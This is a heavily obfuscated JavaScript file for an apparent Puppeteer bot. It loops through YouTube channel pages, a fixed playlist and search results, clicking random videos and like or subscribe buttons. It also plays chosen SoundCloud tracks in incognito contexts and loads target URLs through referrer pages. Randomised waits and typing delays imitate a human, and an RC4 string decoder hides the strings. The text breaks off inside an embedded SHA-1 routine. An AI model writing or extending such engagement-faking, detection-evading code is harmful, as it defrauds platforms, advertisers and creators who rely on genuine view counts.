const a1 = d,
  a0 = c,
  Z = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x581 * 0x2 + 0x932 * 0x2 + -0x761 * 0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * 0x14d3 + 0x3fb + -0x2c * -0x62), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * -0x325b + 0x1 * 0xdf01 + -0x9c2c + (-0x6844 * -0x1 + 0x50a9 * 0x1 + -0x1 * 0x7e55) * random()) : await standardWaitForNetIdle(f), await wait(0x88e + 0x1a8a + 0x1 * -0xf90 + (0x41bc + 0x3c05 + -0x56b1) * random()), -0x14a1 * -0x1 + 0x13e0 + -0x2880;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1 * -0xd13 + 0x2 * -0x7c2 + 0x301f), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x19 * 0xdb + 0xb5d * -0x2 + 0x1 * 0x158;
}
async function randomWait() {
  return await wait(-0x1a00 + -0x4de + 0x1 * 0x3266 + (0x724 * -0x5 + 0x1b * -0x141 + -0x5917 * -0x1) * random()), 0x2 * 0x1091 + -0x1 * 0x25 + -0x4 * 0x83f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x978 + -0x2205 + 0x188d, 0x22af + 0x22c3 + 0x456b * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x55c7 * 0x5 + 0x142f7 + -0x2057a) * getRandomInt(-0x11f * 0x5 + -0xdf3 * -0x1 + -0x856, 0x1 * -0xf76 + 0x1c99 + -0xd1e), h)), -0x1dbb + 0x3 * -0x13a + 0x216a;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xbb6 + 0x77 * -0x2 + -0xe6 * 0xc;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xcff * -0x3 + -0xe8f * -0x1 + 0x186f]['split']('\x20');
    for (let k = -0x1c1c + 0x1 * 0x2173 + -0x557; k < i['length']; k += 0x20e7 * 0x1 + 0xbe0 * -0x2 + -0x925 * 0x1)
      j += i[k] * h[i[k + (0xddb * 0x2 + 0x451 + -0x1 * 0x2006)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te'](R(0x1)))['slice'](0x24c0 + 0x5d * 0x4a + 0x114 * -0x3b)['map'](l => Array['from'](l['children']))['flat'](0x322 * 0x1 + 0x29 * 0x3d + -0xce6)['map'](l => l['childNodes'][0x19ee + -0x427 * -0x5 + -0x90 * 0x53]['childNodes'][0x1a4b * 0x1 + 0xb * -0x1f3 + -0x4da]['childNodes'][0x1 * -0x1ced + -0x20 * 0x7f + 0x2cce]['childNodes'][-0xce5 * 0x1 + 0xf * 0x135 + -0x536]['childNodes'][-0x64 * 0x4d + -0x2 * -0x15b + 0x7 * 0x3e9]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1f37 + 0x9 * -0xcf + 0xc9 * 0x36, 0x2704 + -0x1 * -0x13db + -0x2757)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1 * -0x4d05 + 0x37e2 * 0x1 + 0x4fbb);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1 * -0x1be7a + 0xaf18 + -0x3a * 0x6ad) * getRandomInt(0x308 + -0x2407 + 0x11 * 0x1f1, -0x3 * -0x5ba + 0x3 * -0x26b + -0x4 * 0x27a), h);
  return await wait(i), 0x182 * 0x12 + 0x23b7 + -0x3eda;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * 0x10d9 + -0x250 * -0x8 + -0x1 * 0x2359);
    let h = e[f];
    if (b['neHMYF'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xa * 0xac + 0x2 * 0xe5c + 0x2c * -0x80, s, t, u = -0x211e + 0x3 * -0x545 + 0x30ed; t = n['charAt'](u++); ~t && (s = r % (-0x17a1 * -0x1 + 0x222f + 0x19b * -0x24) ? s * (-0xa * 0x16 + 0x18ba * -0x1 + -0x1 * -0x19d6) + t : t, r++ % (0x1dcb + 0x61 * 0x1 + -0x1e28 * 0x1)) ? p += String['fromCharCode'](-0x1 * -0x143e + 0xb9e * 0x3 + -0x3619 & s >> (-(0x63f * -0x5 + -0x2 * -0x74f + 0x109f) * r & 0x143 * -0x5 + 0x14a1 + -0xe4c)) : -0xe8b + 0x1 * -0xd13 + 0x2 * 0xdcf) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1830 + 0x19 * 0xdb + 0xef * 0x3, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x18fd + 0x416 + -0x1d03))['slice'](-(-0xb4f * 0x3 + 0x115c + 0x1093 * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0xd6 * -0x1f + -0x1 * -0xef8 + 0x2 * -0x1471,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x9 * -0x49 + -0x1f5 * 0x2 + 0x159; u < 0x17ad * -0x1 + -0x14f4 + 0x2da1; u++) {
          p[u] = u;
        }
        for (u = 0x4f3 * 0x7 + 0x1261 * 0x2 + -0x4767; u < 0x1d30 * -0x1 + -0x59b + -0x77 * -0x4d; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x140 * -0x17 + -0x2 * 0x7bb + 0x2d36), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1dbb + 0x3 * -0x13a + 0x2169, q = 0xbb6 + 0x77 * -0x2 + -0xe6 * 0xc;
        for (let v = 0xcff * -0x3 + -0xe8f * -0x1 + 0x186e; v < n['length']; v++) {
          u = (u + (-0x1c1c + 0x1 * 0x2173 + -0x556)) % (0x20e7 * 0x1 + 0xbe0 * -0x2 + -0x827 * 0x1), q = (q + p[u]) % (0xddb * 0x2 + 0x451 + -0x1 * 0x1f07), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x24c0 + 0x5d * 0x4a + 0x1f51 * -0x2)]);
        }
        return t;
      };
      b['WhARSI'] = m, c = arguments, b['neHMYF'] = !![];
    }
    const j = e[0x322 * 0x1 + 0x29 * 0x3d + -0xce7],
      k = f + j,
      l = c[k];
    return !l ? (b['qZIIjW'] === undefined && (b['qZIIjW'] = !![]), h = b['WhARSI'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x31c + 0x6d * 0x42 + -0x2 * 0xc7f]['children'][0xd57 + 0x74d + -0x14a4]['children'][0x31c + 0x11d6 + -0x14f2]['children'][0x1211 + -0x29 * -0x79 + 0x2 * -0x12b9]['children'][-0x7ea + 0x250c + 0xe91 * -0x2]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1594 + -0x1598 * -0x1 + 0x1 * -0x3;
}

function a() {
  const bt = [
    'tw96AwXSys81lG',
    'class',
    'zMXVB3i',
    'pts/410781',
    'EfC1CtC3rwWWEa',
    'AgfZAgvK',
    'v09xnJqPiefWCa',
    'l1mkB8k2W6tcHa',
    'FxdcUhLNxmookG',
    '0\x20(X11;\x20Li',
    'Bsi7DJ0I',
    'E8%84%9A%E',
    'CMfPzgLUzYbIyq',
    'mgnPC1PRExDOzW',
    'AxrOBxmTDhjPzq',
    '3K9ILewnUk',
    'W4BcSmklWQ5OWR3dLeryqq',
    'bSojWQxdIwXlvCkzW7JdJa',
    'WP3cJCk1q8o2W5n8WRxdHH4',
    'WPdcJCkLuCo1W44IWRpcHX4',
    'ujiBqXnn92',
    'ofGYzKy0CgDnma',
    'View',
    'CMCVzw4VC2nYAq',
    'y2vTzw50lwfKmW',
    'youtubeext',
    'zwDYB3vUzc5MDq',
    '%8A%A0%E9%',
    'W5GkkdzOCSkBgmoaiq',
    'WRzdWQBdSG',
    'repeatExte',
    'Ahr0Chm6lY9ZBW',
    'rc1jturzCMOZnq',
    'WOSOW6VcUmkM',
    'A0Xis0XBW6ddJG',
    'Adbqs0zLzdjhqG',
    'W5qvya',
    'oxxcPW',
    'cors'
  ];
  a = function() {
    return bt;
  };
  return a();
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x263d + 0x67 * -0x29 + 0x3 * -0x71e + (0x376 * -0x1 + 0x1aeb + 0x5 * -0x4a7) * random()
  }), await wait(0xfd3 + 0x19ff + -0x27de * 0x1 + (-0x35b * 0x5 + -0x5e8 * 0x4 + 0x2993) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const T = d,
      S = c,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * -0x6c6 + 0x7b * -0x4f + 0x1f31]['childNodes'][0xf07 + 0x8c2 * -0x3 + 0xb40]['childNodes'][0x9de + 0x127f + -0x1c5c]))[Math[S(0x2)](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xac4 + -0xeb1 * 0x1 + 0x197a]['childNodes'][0x1 * 0x12d1 + -0xe45 + -0x184 * 0x3]['childNodes'][0x379 * -0x9 + -0x1c84 + 0x3bc7]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + T(0x16)](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x243 * 0x4 + 0x24d8 + 0x11 * -0x2b3),
          r = -0x10 * 0x17 + -0x1 * -0x1ed6 + -0x2 * 0xeb3;
        for (let u = 0x113 + 0x4 * -0x35b + 0x1d * 0x6d; u < q['length']; u += 0x565 * -0x6 + 0x151 * 0x7 + 0x1 * 0x1729)
          r += q[u] * k[q[u + (-0x386 * -0xb + 0x13ea + -0x3aab)]];
        return r;
      }(n);
  });
  await wait((-0x1b13 + 0x17f2 + -0x3 * -0x1493) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xdb7 * -0x10 + -0x1 * -0x6577 + 0x11 * -0x517) * getRandomInt(-0x240f + -0x255 + 0x2665, -0x327 + -0x1a8 + 0x11 * 0x49), h + (-0x1 * -0x21b3 + 0x186 * -0x10 + 0xa35));
  return await wait(i), 0x3b1 + -0x1f1b + 0x1 * 0x1b6b;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x5a1 + 0x43 + -0x2 * -0x2af), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1645 * 0x1 + 0x29 * 0x1b + -0x2 * -0xed5 + (-0x927 + 0x962 * -0x2 + 0x1 * 0x1fd3) * Math['random']());
    });
  }, -0x1d3f + 0x1237 * 0x2 + 0xd * 0x18d);
  await wait(0x2bb07 * 0x3 + 0x5b89d + 0x100a * -0x95);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xf036 + 0x1819e + 0x1 * -0x18774) * getRandomInt(-0x1 * -0x7c8 + 0x2b3 * -0x5 + 0x5bb, 0x5 * 0x11d + 0xd3 * 0x19 + -0x1a13)), clearInterval(h), 0x11 * 0x24 + 0x1 * 0x67a + -0x8dd;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1796 + 0x17 * 0x33 + 0x1301;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x3 * 0x113 + -0x1c4c + 0xc * 0x217;
    await randomWait();
  }
  return 0x173c + 0x295 + -0x19d0;
}

function fetchRandomSC() {
  const U = c;
  return Math['random']() <= -0x1397 + -0x6e * -0x14 + 0xaff + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0xe2 + -0xf * -0xd6 + -0x1 * 0xd6c + 0.2 ? U(0x1f) + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const X = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xfaa + 0xf14 + -0x5 * 0x626 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x16bd + -0x8c9 * 0x1 + 0x1f86;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const W = b,
            V = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + V(0x1a) + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + W(0x22, 'V]kT'));
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x47a5 + -0x5319 * 0x2 + 0x19d9f + getRandomInt(-0x592c + 0x53cf + 0x3ff5, -0x2 * -0x141b + -0x2 * 0xeda + -0x5 * -0x1556));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x2113 + 0xa4e + 0x16c6), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x41c + 0x6 * 0x212 + -0x850;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + X(0x1d, 'rV$i'));
      return log(v['slice'](0x2fa + -0x6c * 0x13 + -0x1ae * -0x3, -0x1a6 * -0x3 + 0x1fdc * 0x1 + -0x249c)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1c0c + 0x8 * -0x25 + 0x2504 + floor((0x1 * 0x4ff + -0x110b + 0xff4) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x6bebc7a0 + -0x1618ca6e * 0xb + 0x10724eb1a),
          0x1 * 0xbad0e1 + -0x602e6b + 0x255d8a,
          -0xec25 + -0x2 * 0x684d + -0x23cbf * -0x1,
          0x262c + 0x151e + -0x3aca
        ], y = [
          -0x2e * 0x67 + 0x11b8 + 0xe2,
          -0x9 * 0x412 + -0x33 * 0x6a + 0x25 * 0x190,
          -0x2c6 + 0x1 * -0x19af + 0x3 * 0x97f,
          0x117b + -0x2375 + 0x11fa
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x548 + -0x23 * -0x116 + 0x20b9 * -0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x110d + -0x500 + -0xc0d; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x87 + -0x1777 + -0x2 * -0xbff) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x4 * 0x24f + -0x141d + 0x1d59] = A[-0x1 * 0x1741 + -0x6b * 0x6 + 0x19d3] = A[0x289 * -0xf + 0x392 + 0x2276] = A[0x20a6 + -0x1add + -0x5c7] = A[0x34e + 0x1fdc + 0x2327 * -0x1] = A[0x9 * -0x41c + -0x1d6b + 0x426b] = A[-0x96e * -0x3 + 0x17 * -0x182 + -0x669 * -0x1] = A[-0xed2 + 0x114d + -0x1 * 0x275] = A[0x80 * -0x1 + -0x1111 + 0x466 * 0x4] = A[0x245a + -0x148d * -0x1 + -0x38df] = A[0x1a9e + 0x425 * 0x9 + -0x4ea * 0xd] = A[0x2 * -0x6d7 + 0x1b * -0x1b + -0x1091 * -0x1] = A[-0x1a5d + -0x86a + -0x22d2 * -0x1] = A[-0x1 * -0x1204 + 0x24ff + -0x36f7] = A[0x975 + -0xd7a * 0x1 + 0x412] = A[0x1a9c + -0x1310 + -0x77e] = A[0x2545 + 0x1 * -0x1718 + 0xd * -0x116] = 0x102f * 0x1 + 0x116f * 0x2 + -0x330d, this['blocks'] = A) : this['blocks'] = [
                0x190 * 0xb + -0x19fa + -0x32 * -0x2d,
                0x13ce + 0x1 * -0x1257 + 0x19 * -0xf,
                0x15ff + -0x8 * 0xfc + 0xe1f * -0x1,
                0xf01 + 0x1b77 + -0xa9e * 0x4,
                0x1 * -0x268f + 0x3 * 0xa9b + -0x2 * -0x35f,
                0x2 * -0x133 + -0x21ac * 0x1 + -0xa2 * -0x39,
                0x5e3 * 0x5 + 0xef + -0x1e5e * 0x1,
                0x153 + 0x9a5 + -0xaf8,
                -0x93d + -0x110c * 0x2 + 0x2b55 * 0x1,
                0x109 * -0x5 + 0xbc9 + -0x34e * 0x2,
                -0x43 * 0x2d + 0xe1 * -0x1b + 0x25e * 0xf,
                -0x25ee + 0x1dbd + 0x831,
                0x22db * -0x1 + 0x1e9 + -0x1 * -0x20f2,
                -0x5 * 0x22c + 0xcd6 + -0x1fa,
                -0x1905 + -0x10ab + -0x74 * -0x5c,
                0x1e86 + 0x1c91 + -0x3b17,
                0xdef + 0xf * 0x1cf + -0x2910
              ], this['h0'] = 0xe * -0xdfed583 + 0x2e7 * -0x1fe247 + 0x187be8c3c, this['h1'] = -0x8bde824c + -0x121f916cf + 0x29da544a4, this['h2'] = 0xf022b1b2 + 0x2a94 * -0x2b62a + 0x1c0c5f94, this['h3'] = -0x7076d2d + 0x189798d6 + -0x15dd733, this['h4'] = -0xafc619d + -0x270e5 * -0x1716 + -0x9674fcdf * -0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x11b * -0x1 + 0x7 * 0x1f7 + 0x1 * -0xedc, this['finalized'] = this['hashed'] = -0x89 * 0xa + -0x1 * 0x9c7 + 0x3 * 0x50b, this['first'] = -0x610 * 0x2 + -0x35f * 0x6 + 0x205b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x5f3 + 0x54d * 0x7 + -0x2b0e, O = J['length'] || -0x4c * -0x73 + 0x195f + -0x5 * 0xbe7, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * 0x1127 + -0x164c + 0x2773 * 0x1, P[-0x97 * -0x4 + -0x1 * -0x1b7d + -0x1 * 0x1dd9] = this['block'], P[0x16b8 + 0x6 * 0x218 + -0x5c * 0x62] = P[0x93 * 0x7 + -0x18ad * 0x1 + -0x3 * -0x6e3] = P[0x2230 * 0x1 + -0x2a1 * -0x3 + -0x2a11] = P[-0x67 * -0x17 + -0x809 + -0x3 * 0x67] = P[0x2 * 0x551 + 0x1099 + -0x1b37] = P[0x2 * -0xb23 + 0x113c * 0x1 + 0x7 * 0xb9] = P[-0x2618 + 0xa11 + 0x1c0d] = P[0x23cb + 0x12 * 0x131 + -0x3936] = P[0x2313 + -0x87e + -0x1 * 0x1a8d] = P[-0x19e2 * -0x1 + 0x13ba + -0x2d93] = P[-0xf32 + 0x24 * 0x106 + -0x159c] = P[-0x2131 + 0x2239 + -0xfd] = P[-0x177e + 0x1000 + 0x78a] = P[-0x1 * 0x1f42 + 0x6fd + 0x1852] = P[-0x845 + -0x33 * -0x69 + -0xc98] = P[-0x26f7 + -0x19d1 + -0x1 * -0x40d7] = -0x8fa + 0x105f + -0x3 * 0x277), K) {
                    for (N = this['start']; M < O && N < 0x224b + 0x530 + -0x273b; ++M)
                      P[N >> -0x1b13 + -0x17 * 0x7c + -0x5f * -0x67] |= J[M] << y[-0x4f * -0x57 + 0xcb1 + -0x2787 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x3f0 * -0x8 + -0xc4 * -0x7 + -0x249c; ++M)
                      (L = J['charCodeAt'](M)) < 0x7c * -0x1c + 0x151c + -0xb * 0xa4 ? P[N >> 0x2425 + -0x14b9 + -0xf6a] |= L << y[-0x1d04 + -0x10c9 * 0x1 + 0x8 * 0x5ba & N++] : L < -0x2c6 + -0x1c7b + 0x2741 ? (P[N >> 0xb * -0x15c + 0x264b + 0x21 * -0xb5] |= (0x1b57 + 0x59c + 0x1 * -0x2033 | L >> 0x12af + 0xe26 + -0x20cf) << y[-0x2 * -0x6c + 0x1478 + -0x154d & N++], P[N >> 0x1 * -0x1597 + 0x5 * -0x657 + 0x354c] |= (-0x2 * -0xfbc + -0x2390 + -0x2 * -0x24c | 0xc14 + 0x19a2 + 0x2577 * -0x1 & L) << y[0x4 * -0x99a + 0x1a10 * 0x1 + 0xc5b & N++]) : L < -0x5f6f + -0x16b1b + 0x1 * 0x2a28a || L >= -0x17669 + 0x1 * 0x14185 + 0x114e4 ? (P[N >> 0x3 * 0xb41 + 0xb + -0x54 * 0x67] |= (-0x578 + 0x2536 + -0xf6f * 0x2 | L >> -0x9 * -0x2 + -0x754 + 0x74e) << y[-0x25dc + 0x68e * 0x2 + 0x18c3 & N++], P[N >> -0x2fd + -0x53 * 0x22 + -0x25 * -0x61] |= (0xf * 0xb7 + -0xf9a + 0x561 | L >> -0x1 * 0x25aa + 0x1 * -0x1228 + 0x37d8 & 0x854 * -0x2 + 0x67 * 0x3d + -0x7a4) << y[0x85f * 0x1 + -0xafa + 0x29e & N++], P[N >> 0x7d7 + 0x9 * 0x2a1 + -0x1f7e] |= (0xbe * 0x20 + 0x748 * -0x3 + -0x1e * 0xc | -0x14 * -0x4 + -0x245e + 0x244d & L) << y[-0x7e8 + -0x7 * 0x31d + 0xedb * 0x2 & N++]) : (L = 0x23aa * 0xa + -0x168de + 0x1043a + ((0x1 * -0x61d + 0x1 * -0xfa7 + 0x19c3 & L) << -0x1b4f + -0x20d5 + 0x1 * 0x3c2e | -0x15c3 + 0x1c36 + -0x274 & J['charCodeAt'](++M)), P[N >> 0x7 * 0x218 + -0x58 * -0xe + 0x35 * -0x5e] |= (-0x206b + -0x24c1 * -0x1 + -0x366 | L >> -0x17c0 + 0x1ac4 + -0x3a * 0xd) << y[-0x7 * -0x11d + 0x1511 * 0x1 + -0x41f * 0x7 & N++], P[N >> -0x2 * 0xb73 + 0xcee + 0x9fa] |= (-0x66e * -0x2 + -0x19f2 + -0x2 * -0x6cb | L >> -0x1 * 0x2593 + 0x3 * 0x9f + 0x23c2 & 0x1c * -0x110 + 0x19 * 0x101 + 0x4e6) << y[-0x2518 + -0x210c + 0x4627 & N++], P[N >> 0x31 * 0x45 + 0xcf3 + 0x1 * -0x1a26] |= (0x20 * 0xd + -0xe95 * 0x2 + 0x1c0a | L >> 0x2372 + 0x13 * -0x21 + 0x17 * -0x16f & 0x1072 + -0x1de1 * -0x1 + -0x2e14) << y[0x16a * -0x15 + -0xd53 + -0xc * -0x396 & N++], P[N >> 0xcdf + 0xef * -0x3 + -0xa10] |= (-0x1d27 + 0x1 * 0x191d + 0x48a | -0x863 + 0x1 * -0x65f + 0xf01 & L) << y[0x9ba + -0x1829 + 0xe72 * 0x1 & N++]);
                  }
